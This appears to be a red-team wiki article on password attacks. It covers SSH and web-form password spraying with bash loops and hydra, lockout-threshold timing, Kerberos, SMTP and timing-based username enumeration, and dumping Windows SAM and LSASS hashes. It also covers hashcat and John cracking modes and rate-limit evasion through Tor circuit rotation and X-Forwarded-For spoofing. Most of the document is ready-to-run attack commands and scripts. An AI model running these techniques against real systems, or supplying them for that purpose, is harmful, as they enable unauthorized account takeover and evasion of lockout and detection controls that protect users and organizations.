Password Attacks

Password spraying, brute force, hash cracking, and credential enumeration techniques for red team operations.

Overview

Password attacks are defined by how many accounts you target and how many passwords you try per account. That ratio decides whether you risk locking accounts out, which endpoint you should use, and how long the attack takes. This article covers locked-out avoidance, username enumeration, built-for-target wordlists, GPU -accelerated cracking with hashcat and John the Ripper, and rate-limit bypasses.

The Attack Spectrum

Password attacks fall on a spectrum defined by two axes: how many accounts you target and how many passwords you try per account. Understanding this distinction is critical - choosing the wrong attack type triggers account lockouts and wastes time. 

                      MANY ACCOUNTS
                           │
      Password Spraying    │    Credential Stuffing
      (1 password,         │    (breached creds,
       many accounts)      │     many accounts)
                           │
     ───────────────────────────────────────────
     ONE PASSWORD          │              MANY PASSWORDS
                           │
      Targeted Guess       │    Brute Force
      (1 password,         │    (many passwords,
       1 account)          │     1 account)
                           │
                      ONE ACCOUNT

Password Spraying : Try a single common password (e.g. Summer2026! ) against every account in the domain. Avoids lockout because each account sees only one failed attempt. The most reliable initial access technique against organizations with password expiration policies that generate predictable seasonal passwords.

Brute Force : Try thousands of passwords against a single known account. Only viable when you have confirmed no lockout policy exists or the threshold is high enough to complete the attack within the window.

Credential Stuffing : Use previously breached username:password pairs. Not a guessing attack

  • you already have the credentials and are testing where they work. Covered in detail in /wiki/articles/redteam/credential-stuffing.html

.

Password Spraying - The Silent Approach

Password spraying succeeds because organizations implement complexity requirements that are trivially predictable. A policy requiring "8+ characters, uppercase, lowercase, number, special character" with 90-day expiration produces SeasonYear! patterns. Users increment the season and year: Winter2025! , Spring2025! , Summer2026! .

The attack surface is any authentication endpoint that accepts a username and password:

  • OWA (Outlook Web Access)
  • ADFS (Active Directory Federation Services)
  • VPN portals (Cisco AnyConnect, Pulse Secure, Open VPN )
  • Citrix StoreFront
  • SSH
  • RDP (Remote Desktop)
  • Custom web applications

Manual Spraying

Before touching tools, understand what's happening at the wire level. Here's a manual spray against SSH using a bash loop: 

#!/bin/bash
# manual-spray-ssh.sh - Password spray against SSH
PASSWORD="Summer2026!"
USERLIST="users.txt"        # one username per line
TIMEOUT=3                   # seconds before SSH timeout

while IFS= read -r user; do
    echo "[*] Trying ${user}:${PASSWORD}"

    # timeout prevents hanging on slow responses
    sshpass -p "${PASSWORD}" \
        ssh -o StrictHostKeyChecking=no \
            -o ConnectTimeout=${TIMEOUT} \
            -o PasswordAuthentication=yes \
            -o PreferredAuthentications=password \
            "${user}@10.0.0.5" 'whoami; hostname' 2>/dev/null

    # Rate limit: wait between attempts to avoid triggering IDS
    sleep 2
done < "${USERLIST}"

The key insight: each account gets exactly one attempt. Even if lockout is set to 5 failed attempts, no user exceeds 1. The sleep 2 prevents log correlation that reveals the pattern.

Spraying with Hydra

Hydra's -L flag provides the username list. The -p flag provides the single password being sprayed. 

# SSH spray - single password against user list
hydra -L users.txt -p 'Summer2026!' ssh://10.0.0.5

# HTTP POST spray against OWA/RDWeb/Custom login forms
# Format: /path:body:pattern
hydra -L users.txt -p 'Summer2026!' 10.0.0.5 http-post-form \
  "/login.php:username=^USER^&password=^PASS^&Login=Login:Invalid password"

# SMB spray - checks NetBIOS/445
hydra -L users.txt -p 'Summer2026!' smb://10.0.0.5

# FTP spray
hydra -L users.txt -p 'Summer2026!' ftp://10.0.0.5

# RDP spray (slow - RDP has inherent latency)
hydra -L users.txt -p 'Summer2026!' rdp://10.0.0.5

The ^USER^ and ^PASS^ tokens are hydra's placeholders. The :Invalid password string is hydra's success/failure indicator - hydra checks if the response body contains this string; if it does NOT contain it, hydra marks the login as successful. This is the most common mistake beginners make: providing a failure indicator but getting the comparison logic backwards.

Validation - The Correct Failure String

# First, manually verify the failure message
curl -X POST http://10.0.0.5/login.php \
  -d 'username=wronguser&password=wrongpass&Login=Login' \
  -s | grep -i 'invalid\|incorrect\|failed\|wrong'

# The string hydra checks - if it DOES appear, login FAILED
# Use a string UNIQUE to the failure case
# Common failure indicators:
# "Invalid password"        - reveals username EXISTS (information leak)
# "Invalid username"        - reveals username does NOT exist
# "Login failed"            - generic, no info leak
# "Invalid username or password" - generic, no info leak

Output Interpretation

# Hydra output - successful logins marked with host:port
# [22][ssh] host: 10.0.0.5   login: jdoe   password: Summer2026!
# [80][http-post-form] host: 10.0.0.5   login: jdoe   password: Summer2026!

# The format is:
# [port][service] host: IP   login: USERNAME   password: PASSWORD

# For automated parsing:
hydra -L users.txt -p 'Summer2026!' ssh://10.0.0.5 -o found-creds.txt

Account Lockout - Detection and Bypass

Organizations configure lockout policies in Active Directory Group Policy or per-service. Before any password attack, enumerate the lockout threshold.

Active Directory Lockout Enumeration

# Method 1: net accounts (Windows, from domain-joined machine)
net accounts

# Output includes:
# Lockout threshold:        5
# Lockout duration:        30 minutes
# Lockout observation window: 30 minutes

# Method 2: LDAP query (Linux)
ldapsearch -x -H ldap://dc01.corp.local \
  -D "corp\\jsmith" -w 'password' \
  -b "DC=corp,DC=local" \
  "(objectClass=domainDNS)" \
  lockoutThreshold lockoutDuration lockoutObservationWindow

# Method 3: CrackMapExec (preferred - non-authenticated enumeration often fails)
crackmapexec smb 10.0.0.5 --pass-pol

# This queries the registry over SMB if null sessions are allowed:
# Password Policy:
#   Minimum password length: 8
#   Password history length: 24
#   Maximum password age: 90 days
#   Minimum password age: 1 day
#   Account lockout threshold: 5
#   Account lockout duration: 30 minutes
#   Reset account lockout counter after: 30 minutes

Linux Lockout - PAM configuration

# /etc/security/faillock.conf (or /etc/pam.d/system-auth)
# faillock tracks failed attempts per-user
cat /etc/security/faillock.conf
# deny = 5              <- lockout after 5 failures
# unlock_time = 600     <- auto-unlock after 10 minutes
# fail_interval = 900   <- reset counter after 15 minutes

# Check current failed attempts:
faillock --user jdoe
# jdoe:
# When                Type  Source       Valid
# 2026-06-26 14:30:01 RHOST 10.5.5.1        V
# 2026-06-26 14:30:03 RHOST 10.5.5.1        V
# Reset if needed (requires root):
faillock --user jdoe --reset

Lockout Bypass Strategies

Strategy 1: Spray Below Threshold

With lockout threshold = 5 and observation window = 30 minutes, spray 1 password every 31 minutes. This allows 4 attempts per account before reset. Total time = passwords x 31 min. For a 20-password spray list: 20 x 31 = 620 minutes~= 10.3 hours. For 100 accounts, this is deeply impractical for manual execution but trivial for automated tools that track per-account attempt counts. 

#!/bin/bash
# interval-spray.sh - Respects lockout observation window
LOCKOUT_WINDOW=1800        # seconds (30 min)
SPRAY_INTERVAL=$((LOCKOUT_WINDOW + 60))  # +60s safety margin
PASSWORDS=("Summer2026!" "Password123" "Company2026!" "Welcome2026!")
USERS_FILE="users.txt"

for pass in "${PASSWORDS[@]}"; do
    echo "[*] Spraying password: ${pass}"
    hydra -L "${USERS_FILE}" -p "${pass}" ssh://10.0.0.5 \
      -t 1 -w 30 -o "result-${pass}.txt"
    # -t 1: single thread (prevents race conditions)
    # -w 30: 30-second wait between connections
    sleep "${SPRAY_INTERVAL}"
done

Strategy 2: Target Multiple Endpoints

If the same account exists across OWA, VPN , and Citrix with independent lockout counters, you can spray 3x faster by cycling across endpoints. The lockout is per-service, not per-account. 

#!/bin/bash
# multi-endpoint-spray.sh
PASSWORD="Summer2026!"
USERS="users.txt"

# Spray across independent endpoints - each has its own counter
parallel --jobs 3 --line-buffer << 'EOF'
hydra -L users.txt -p "Summer2026!" https-post-form://owa.corp.local/owa/auth.owa
hydra -L users.txt -p "Summer2026!" https-post-form://vpn.corp.local/+webvpn+/index.html
hydra -L users.txt -p "Summer2026!" https-post-form://citrix.corp.local/citrix/storeweb/
EOF

Strategy 3: Timing Enumeration

If you can enumerate valid usernames first (see below), your spray list shrinks from "all domain users" to "confirmed existing users," dramatically reducing total attempts and lockout risk.

User Enumeration

Discovering valid usernames before spraying reduces noise and avoids lockouts. Each service leaks information differently.

Kerberos User Enumeration

# Kerbrute - sends TGT requests, different error codes reveal existence
# KDC_ERR_C_PRINCIPAL_UNKNOWN  - user DOES NOT exist
# KDC_ERR_PREAUTH_REQUIRED     - user EXISTS
kerbrute userenum -d corp.local users.txt --dc 10.0.0.5

# Manual via impacket (no tool needed):
# impacket-GetNPUsers requests a TGT for users without preauth
# If user exists with preauth: KDC_ERR_PREAUTH_REQUIRED
# If user does not exist: KDC_ERR_C_PRINCIPAL_UNKNOWN
impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip 10.0.0.5

Timing-Based Enumeration

Services return valid/invalid responses at subtly different speeds. Valid users trigger a full authentication sequence (credential verification, group lookup, profile load); invalid users short-circuit at the first check. 

#!/bin/bash
# timing-enum.sh - Measure auth response times
TARGET="10.0.0.5"
WORDLIST="potential-users.txt"

echo "user,time_ms" > timing-results.csv

while IFS= read -r user; do
    # Time the SSH attempt - timeout prevents hanging
    start=$(date +%s%N)
    sshpass -p 'WRONG_PASSWORD' \
        ssh -o StrictHostKeyChecking=no \
            -o ConnectTimeout=5 \
            -o NumberOfPasswordPrompts=1 \
            "${user}@${TARGET}" 'exit' 2>/dev/null
    end=$(date +%s%N)
    elapsed=$(( (end - start) / 1000000 ))
    echo "${user},${elapsed}" >> timing-results.csv
    sleep 0.5
done < "${WORDLIST}"

# Analyze: valid users typically have higher response times
# (processing password hash takes measurable time)
sort -t',' -k2 -nr timing-results.csv | head -20

# Visual analysis:
# jdoe,450ms     <- valid user (full auth attempted)
# jsmith,445ms   <- valid user
# asmith,12ms    <- invalid user (immediate reject)
# bob,11ms       <- invalid user
# The gap between 12ms and 445ms is the signal

HTTP Status Code Enumeration

# Genuinely useful enumeration pattern - different HTTP responses
# 200 OK with "Invalid password"    -> valid user
# 200 OK with "Invalid username"    -> invalid user
# 302 Redirect to /dashboard        -> valid login (unlikely with wrong pass)
# 403 Forbidden on specific users   -> valid user, account disabled

# Automated testing:
while IFS= read -r user; do
    response=$(curl -s -o /dev/null -w "%{http_code}" \
        -X POST http://10.0.0.5/login \
        -d "username=${user}&password=test")
    echo "${user} -> HTTP ${response}"
done < users.txt

SMTP VRFY/RCPT TO Enumeration

# VRFY command - many MTAs disable this
telnet mail.corp.local 25
EHLO test
VRFY jdoe
# 252 2.0.0 jdoe@corp.local           <- user exists
# 550 5.1.1 User unknown               <- user does not exist

# RCPT TO - more reliable, works during MAIL FROM sequence
# Even if VRFY is disabled, RCPT TO often reveals existence:
nc mail.corp.local 25
HELO test
MAIL FROM:<test@test.com>
RCPT TO:<jdoe@corp.local>
# 250 2.1.5 OK                         <- exists
# 550 5.1.1 User unknown               <- does not exist

Password Lists - Building Ammunition

Generic wordlists miss organizational context. Effective spraying requires passwords tailored to the target.

Standard Wordlists

# rockyou.txt - 14 million passwords from the RockYou breach (2009)
# Still contains the most common human-chosen passwords
ls -lh /usr/share/wordlists/rockyou.txt.gz
zcat /usr/share/wordlists/rockyou.txt.gz | wc -l   # 14,344,391

# SecLists - Daniel Miessler's collection, organized by category
git clone https://github.com/danielmiessler/SecLists.git
ls SecLists/Passwords/
# Common-Credentials/          - most-used passwords
# Leaked-Databases/            - breach compilations
# Software/                    - default passwords per vendor
# Seasons/                     - seasonal passwords with years
# Months/                      - month+year combinations
# Keyboard-Combinations/       - keyboard walk patterns

Seasonal/Situational Password Lists

Organizations with 90-day password rotation produce time-predictable passwords. Generate them:

#!/bin/bash
# seasonal-passwords.sh - Generate season+year+symbol combinations
SEASONS=("Spring" "Summer" "Fall" "Fall!" "Autumn" "Winter")
YEARS=$(seq 2024 2027)
SYMBOLS=("!" "@" "#" "$" "%" "^" "&")
DIGITS=("1" "12" "123" "1234" "!" "!1" "!2")

for season in "${SEASONS[@]}"; do
    for year in ${YEARS}; do
        echo "${season}${year}"          # Spring2026
        echo "${season}${year}!"         # Spring2026!
    done
done

# Also generate l33tspeak variations of company name
# Company: "AcmeCorp"
# Variants: AcmeCorp2026!, Acm3C0rp2026!, @cmeCorp2026, AcmeCorp#2026

Targeted Wordlists with cewl

cewl spiders a target website and builds a wordlist from the content. The insight: company websites contain their password patterns. A company named "Acme Corp" with a blog about "cloud infrastructure" generates passwords containing "Acme," "Cloud," and their 2026 conference dates. 

# Basic cewl - spider to depth 2, minimum word length 6
cewl -d 2 -m 6 -w acme-words.txt https://www.acme-corp.com/

# Include email addresses in output (often contain naming conventions)
cewl -d 2 -m 4 -e --email_file acme-emails.txt \
  -w acme-words.txt https://www.acme-corp.com/

# Build a targeted list with password policy applied
# Policy: min 8 chars, uppercase, lowercase, number, special
hashcat --stdout -r /usr/share/hashcat/rules/best64.rule acme-words.txt \
  | grep -E '^.{8,}$' \
  | grep -E '[A-Z]' \
  | grep -E '[a-z]' \
  | grep -E '[0-9]' \
  | grep -E '[!@#$%^&*]' \
  > acme-targeted.txt

Hash Identification

When you dump hashes (from /etc/shadow, SAM, NTDS.dit, database dumps, or intercepted network traffic), you must identify the hash type before cracking. 

# hashid - python tool, identifies hash format
echo '$2y$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy' | hashid
# Analyzing '$2y$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy'
# [+] Blowfish(OpenBSD)
# [+] Woltlab Burning Board 4.x
# [+] bcrypt

echo '5f4dcc3b5aa765d61d8327deb882cf99' | hashid
# [+] MD5
# [+] MD2 / MD4 / LM / NTLM (ambiguous)

# hash-identifier - older tool, same functionality
echo '$6$saltsaltsalt$encryptedhash' | hash-identifier

Hash Format Reference

Format Prefix Example Strength
MD5 (unsalted) none 5f4dcc3b5aa765d61d8327deb882cf99 Cracked instantly
MD5 (salted) $1$ $1$salt$hash Cracked instantly
SHA-256 crypt $5$ $5$salt$hash Slow (5000 rounds)
SHA-512 crypt $6$ $6$salt$hash Slow (5000 rounds)
bcrypt $2a$or$2b$or$2y$ $2y$10$salt.hash Very slow (cost=10)
NTLM 32-char hex A4F49C406510BDCAB6824EE7C30FD852 Extremely fast to crack
NetNTLMv2 $NETNTLMv2$ Includes challenge/response Slower than NTLM
Kerberos TGT $krb5tgs$23$ AS-REP or TGS-REP hash Medium (depends on RC4)
WPA2 $WPAPSK$ Full 4-way handshake Slow (4096 iterations PBKDF2)

Hashcat - GPU-Accelerated Hash Cracking

hashcat is the industry standard for hash cracking. It leverages GPU compute (CU DA /OpenCL) to parallelize hash computation orders of magnitude faster than CPU -based tools.

Installation on ArchLinux

# Install hashcat (CUDA or OpenCL depending on GPU)
sudo pacman -S hashcat

# For NVIDIA GPU acceleration:
sudo pacman -S cuda opencl-nvidia

# For AMD GPU acceleration:
sudo pacman -S opencl-amd rocm-opencl-runtime

# Verify GPU detection
hashcat -I
# OpenCL Platform #1: NVIDIA Corporation
# * Device #1: NVIDIA GeForce RTX 4090, 23808/24252 MB allocatable

# Benchmark your hardware
hashcat -b | head -30
# MD5:       150000 MH/s    (150 billion hashes/second)
# SHA1:       55000 MH/s
# NTLM:       125000 MH/s   (NTLM is MD4 - very fast)
# bcrypt $2*$:   500 kH/s   (brutally slow - by design)
# WPA2 PMKID:  2000 kH/s

This benchmark is critical information. The speed difference between NTLM (125 GH/s) and bcrypt (500 kH/s) is five orders of magnitude . This is WHY hash selection matters.

Attack Modes

hashcat supports multiple attack modes selected with -a :

Mode Flag Description When to Use
Dictionary -a 0 Straight wordlist attack You have a good wordlist tailored to the target
Combinator -a 1 Combine words from two lists Passwords that are two words joined (e.g., "BlueCar")
Brute-Force -a 3 Mask attack (charset-based) Short passwords or known patterns
Hybrid Dict+Mask -a 6 Wordlist + mask appended Known words plus predictable suffixes (e.g., "Password123!")
Hybrid Mask+Dict -a 7 Mask + wordlist appended Predictable prefixes plus known words
Association -a 9 Single word per hash (username:hash) When you have username-hash pairs

Mode 0 - Dictionary Attack

# Basic dictionary attack
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# -m 0: hash mode (0 = MD5)

# With rules applied to each word
hashcat -m 0 -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Multiple rules files sequentially
hashcat -m 1000 -a 0 ntlm-hashes.txt rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule \
  -r /usr/share/hashcat/rules/d3ad0ne.rule

Mode 3 - Mask Attack

Mask attacks use charset placeholders to define password structure:

Placeholder Charset Example
?l lowercase abc
?u uppercase ABC
?d digits 123
?s special !@#
?a all above aB1!
?b bytes binary
?h hex lowercase a1f
?H hex uppercase A1F 
# Password pattern: exactly 8 lowercase letters
# Keyspace: 26^8 = 208,827,064,576
hashcat -m 0 -a 3 hashes.txt ?l?l?l?l?l?l?l?l

# Password pattern: 6 letters + 2 digits (common format)
# Keyspace: 26^6 x 10^2 = 30,891,577,600
hashcat -m 1000 -a 3 ntlm-hashes.txt ?l?l?l?l?l?l?d?d

# Password pattern: 1 uppercase + 7 lowercase + 1 digit + 1 special
# Keyspace: 26 x 26^7 x 10 x 33 ~= 2.5 x 10^17 (258 quadrillion)
hashcat -m 0 -a 3 hashes.txt ?u?l?l?l?l?l?l?l?d?s

# Incremental mask - start short, grow longer
hashcat -m 0 -a 3 --increment --increment-min=6 --increment-max=10 \
  hashes.txt ?a?a?a?a?a?a?a?a?a?a
# --increment iterates: 6 chars, then 7, then 8, 9, 10

Custom Charsets

# Define custom charset 1: uppercase + common symbols
# Define custom charset 2: target company name fragments
# Password: CompanyName2026!
hashcat -m 0 -a 3 hashes.txt \
  -1 AcmeCorp \
  -2 ?d?d?d?d \
  -3 !@# \
  ?1?2?3

# Company + month + year (e.g., AcmeJune2026)
hashcat -m 0 -a 3 hashes.txt \
  -1 ?u?l?l?l?l?l?l?l?l \
  -2 January,February,March,April,May,June,July,August,September,October,November,December \
  ?1?2?d?d?d?d

Mode 6 and 7 - Hybrid Attacks

# Mode 6: wordlist + append mask
# Take each word from rockyou, append 2 digits
# "password" -> "password00" through "password99"
hashcat -m 0 -a 6 hashes.txt rockyou.txt ?d?d

# Mode 7: prepend mask + wordlist
# "!password", "@password", "#password", ...
hashcat -m 0 -a 7 hashes.txt ?s rockyou.txt

# Hybrid with complex append: word + 2 digits + 1 special
hashcat -m 1000 -a 6 ntlm-hashes.txt rockyou.txt ?d?d?s

Mode 1 - Combinator Attack

# Combine every word from two wordlists
# list1: ["blue", "red", "green"]
# list2: ["car", "dog", "house"]
# Result: "bluecar", "bluedog", "bluehouse", "redcar", ...
hashcat -m 0 -a 1 hashes.txt list1.txt list2.txt

# Company departments + years
# departments: ["IT", "HR", "Sales", "Finance"]
# years: ["2024", "2025", "2026"]
# Result: "IT2024", "HR2024", "Sales2024", ...
hashcat -m 0 -a 1 hashes.txt departments.txt years.txt

# Use --stdout to preview combinations
hashcat --stdout -a 1 departments.txt years.txt | head

Cracking /etc/shadow (Linux)

# Extract the hash from /etc/shadow
# Format: username:$type$salt$hash:lastchange:...
# jdoe:$6$LxQz3HlR$jR7k2PmN8v...:19000:0:99999:7:::

# Combine with /etc/passwd for unshadow format
unshadow /etc/passwd /etc/shadow > linux-hashes.txt

# hashcat mode 1800 = sha512crypt ($6$)
hashcat -m 1800 linux-hashes.txt rockyou.txt

# John the Ripper alternative
john --wordlist=rockyou.txt linux-hashes.txt
john --show linux-hashes.txt        # show cracked passwords

NTLM Cracking (Windows)

# Dump NTLM hashes from SAM/SYSTEM (requires admin/SYSTEM)
# On the target Windows machine:
# reg save HKLM\SAM sam.save
# reg save HKLM\SYSTEM system.save

# Extract hashes with secretsdump (impacket)
impacket-secretsdump -sam sam.save -system system.save LOCAL

# Or dump from LSASS (requires elevated debug privilege):
# Sekurlsa::logonpasswords with mimikatz

# NTLM hash format: LM:NT
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

# Save only the NT part (32 hex chars)
echo "31d6cfe0d16ae931b73c59d7e0c089c0" > ntlm-hashes.txt

# Crack NTLM with hashcat
hashcat -m 1000 ntlm-hashes.txt rockyou.txt -O
# -O: optimized kernel (faster, but limited password length to 31)

# NTLM is MD4(UTF-16LE(password)) - extremely fast to compute
# RTX 4090: ~125 GH/s - 125 billion guesses per second
# A 7-character password with mixed case+digits: cracked in seconds.
# An 8-character fully random (?a?a?a?a?a?a?a?a): ~6.6 x 10^15 / 125x10^9 = ~14.7 hours.

Rule-Based Attacks

Rules transform each word in a wordlist before hashing. The best64.rule contains 64 common mutations; d3ad0ne.rule contains 34,197 rules. 

# Apply best64.rule to rockyou.txt
hashcat -m 0 -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# best64.rule transformations include:
# sa@          -> replace all 'a' with '@'  (p@ssword)
# se3          -> replace all 'e' with '3'  (pass3word)
# c (capitalize first letter)              (Password)
# $1 $2 $3     -> append 123                 (password123)
# T0 (toggle case at position 0)           (Password)

# OneRuleToRuleThemAll.rule - 51,000+ rules
# https://github.com/NotSoSecure/password_cracking_rules
hashcat -m 1000 -a 0 ntlm-hashes.txt rockyou.txt \
  -r OneRuleToRuleThemAll.rule

Incremental/Markov Attacks

hashcat's built-in Markov model predicts the most probable next character based on previous characters. This dramatically reduces keyspace for brute-force by prioritizing human-like patterns over random sequences. 

# Markov-based mask attack (built into hashcat)
hashcat -m 0 -a 3 hashes.txt --markov-hcstat2=/usr/share/hashcat/hcstat2/hcstat2.hcstat

# statsprocessor - external Markov tool, generates wordlist
# git clone https://github.com/hashcat/statsprocessor
sp64.bin --pw-min=8 --pw-max=8 -o markov-8chars.txt rockyou.txt
# Generates 8-character strings using character transition probabilities
# learned from rockyou.txt

Piping and Distributed Cracking

# Generate candidates from hashcat and pipe to john
hashcat --stdout -a 3 ?u?l?l?l?l?l?d?d | john --pipe --stdin hashes.txt

# Distribute cracking across multiple machines:
# Machine 1: first half of keyspace
hashcat -m 1000 -a 3 -s 0 -l 50000000000 ntlm-hashes.txt ?a?a?a?a?a?a?a?a

# Machine 2: second half of keyspace
hashcat -m 1000 -a 3 -s 50000000001 -l 100000000000 ntlm-hashes.txt ?a?a?a?a?a?a?a?a

# Restore interrupted session:
hashcat --restore --session mysession

# Save session regularly:
hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a?a?a --session=brute8 --status-timer=5
# Press [p] to pause (creates .restore file)
# Press [r] to resume

Password Strength Analysis

Understanding how long each hash type takes to crack informs target prioritization and hash selection. 

#!/usr/bin/env python3
"""password-entropy.py - Calculate keyspace and estimated crack time"""
import math

def entropy_calculation(password_length: int, charset_size: int) -> float:
    """Shannon entropy: H = L x log2(N)
    L = length, N = charset size
    """
    return password_length * math.log2(charset_size)

def keyspace(password_length: int, charset_size: int) -> int:
    """Total possible combinations: N^L"""
    return charset_size ** password_length

def crack_time_estimate(keyspace_val: int, hash_rate: float) -> tuple[float, str]:
    """Estimate time to exhaust keyspace at given hash rate"""
    seconds = keyspace_val / hash_rate
    if seconds < 60:
        return seconds, "seconds"
    elif seconds < 3600:
        return seconds / 60, "minutes"
    elif seconds < 86400:
        return seconds / 3600, "hours"
    elif seconds < 31536000:
        return seconds / 86400, "days"
    else:
        return seconds / 31536000, "years"

# Character sets
charsets = {
    "digits [0-9]": 10,
    "lowercase [a-z]": 26,
    "lower+upper [a-zA-Z]": 52,
    "lower+upper+digits": 62,
    "all printable (?a)": 95,
}

# Hash rates on RTX 4090 (approximate, single GPU)
hash_rates = {
    "NTLM (MD4)": 125_000_000_000,      # 125 GH/s
    "MD5":         150_000_000_000,      # 150 GH/s
    "SHA1":         55_000_000_000,      # 55 GH/s
    "SHA256":       23_000_000_000,      # 23 GH/s
    "sha512crypt":      15_000,         # 15 kH/s
    "bcrypt cost=10":       500,        # 500 H/s
    "WPA2 PMKID":       8_000_000,      # 8 MH/s
    "PBKDF2-SHA256 100k":  23_000,       # 23 kH/s
}

print(f"{'Length':>6} {'Charset':>20} {'Entropy':>8} {'Keyspace':>22} {'NTLM Time':>16} {'bcrypt Time':>18}")
print("-" * 92)

for length in [6, 7, 8, 9, 10, 12]:
    for name, size in charsets.items():
        ent = entropy_calculation(length, size)
        ks = keyspace(length, size)
        ntlm_time, ntlm_unit = crack_time_estimate(ks, hash_rates["NTLM (MD4)"])
        bcrypt_time, bcrypt_unit = crack_time_estimate(ks, hash_rates["bcrypt cost=10"])

        ks_str = f"{ks:.2e}" if ks > 1e15 else str(ks)
        ntlm_str = f"{ntlm_time:.1f} {ntlm_unit}"
        bcrypt_str = f"{bcrypt_time:.1f} {bcrypt_unit}"

        print(f"{length:>6} {name:>20} {ent:>8.1f} {ks_str:>22} {ntlm_str:>16} {bcrypt_str:>18}")

Run this script. The output demonstrates why bcrypt's work factor makes exhaustive search infeasible even for short passwords, while NTLM 's speed means any 8-character password falls within hours.

Rate Limiting Bypass Techniques

Web applications implement various rate limiting mechanisms. Each has bypass vectors.

IP-Based Rate Limiting

Most applications rate-limit by source IP . Bypass via IP rotation: 

# Method 1: Tor rotation
# Install tor, configure ControlPort
sudo pacman -S tor
echo "ControlPort 9051" | sudo tee -a /etc/tor/torrc
echo "HashedControlPassword $(tor --hash-password 'mypassword')" | sudo tee -a /etc/tor/torrc
sudo systemctl start tor

# Request new identity (new exit node) before each attempt
for pass in $(cat passwords.txt); do
    echo -e "AUTHENTICATE \"mypassword\"\r\nSIGNAL NEWNYM\r\n" | nc 127.0.0.1 9051
    sleep 2
    curl -x socks5h://127.0.0.1:9050 \
        -d "username=admin&password=${pass}" \
        https://target.com/login
done

# Method 2: AWS API Gateway / CloudFront IP ranges
# Modern cloud services have massive IP pools
# Each request can come from a different AWS region's outbound IP

# Method 3: Residential proxy networks
# Services like BrightData, Oxylabs provide rotating residential IPs

Header-Based Rate Limiting Bypass

Rate limiters often trust X-Forwarded-For or X-Real-IP headers: 

# Test if X-Forwarded-For overrides rate limiter
for i in $(seq 1 20); do
    curl -H "X-Forwarded-For: 10.${i}.${i}.${i}" \
        -d "username=admin&password=test" \
        https://target.com/login \
        -w "\nHTTP: %{http_code}\n"
    sleep 0.1
done
# If all return 200 (not 429), the rate limiter trusts X-Forwarded-For

Session-Based Bypass

Some rate limiters track by session cookie. Each new request generates a new session:

# No cookie = new session each request
for pass in $(head -100 passwords.txt); do
    curl -s -d "username=admin&password=${pass}" \
        https://target.com/login \
        -o /dev/null -w "%{http_code}\n"
    sleep 0.05
done

Common Problems

hashcat Shows No Devices

Install an OpenCL runtime for your GPU ( opencl-nvidia or rocm-opencl-runtime ) and confirm that the hashcat package was built with OpenCL support.

Hydra Hangs on SSH

SSH servers sometimes do not close connections cleanly on authentication failure. Use -t 4 -w 30 to limit threads and add a timeout.

Accounts Lock Out During Spraying

You are spraying too fast or the lockout threshold is lower than expected. Reduce to one password per observation window and verify the lockout policy first.

Token Length Exception on NTLM Hashes

NTLM hashes must be exactly 32 hex characters. Strip the LM hash part and put each hash on its own line with no extra characters.
